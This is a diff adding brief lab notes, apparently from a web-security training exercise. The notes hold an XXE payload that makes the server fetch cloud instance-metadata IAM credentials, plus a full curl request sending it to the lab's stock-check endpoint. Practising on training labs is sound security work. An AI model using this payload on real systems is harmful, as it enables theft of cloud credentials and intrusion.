@@ -1,0 +1,13 @@
+
+http://169.254.169.254/
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
+
+
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0a570014041d4154810539a300c10000.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://0a570014041d4154810539a300c10000.web-security-academy.net/product?productId=1' -H $'Content-Type: application/xml' -H $'Content-Length: 226' -H $'Origin: https://0a570014041d4154810539a300c10000.web-security-academy.net' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=QywOzxzpT7AHfKsJpSDIWANFhPVvZiAc' \
+    --data-binary $'<?xml version=\"1.0\" encoding=\"UTF-8\"?>\x0d\x0a<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"> ]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>' \
+    $'https://0a570014041d4154810539a300c10000.web-security-academy.net/product/stock'
